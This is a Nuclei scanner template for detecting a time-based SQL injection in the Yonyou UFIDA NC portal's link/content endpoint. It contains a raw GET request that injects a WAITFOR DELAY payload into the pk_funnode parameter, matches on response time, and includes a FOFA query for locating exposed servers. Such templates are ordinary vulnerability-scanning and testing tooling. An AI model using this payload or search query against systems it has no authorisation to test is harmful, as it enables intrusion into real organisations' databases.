id: yonyou-nc-content-sqli
info:
  name: 用友 UFIDA NC link/content- sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/02ac90075317fcc0cacfb84ea681079b0892a174/%E7%94%A8%E5%8F%8BNC%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3link%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
  tags: yonyou,nc,sqli,oa,time

http:
  - raw:
      - |
        @timeout: 15s
        GET /portal/pt/link/content?pageId=login&pk_funnode=1';waitfor%20delay%20'0:0:6'--&pk_menuitem=2&pageModule=3&pageName=4 HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: identity
        Accept-Language: zh-CN,zh;q=0.8
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
        Connection: keep-alive
        Referer: http://www.baidu.com
        Cache-Control: max-age=0

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 200
        condition: and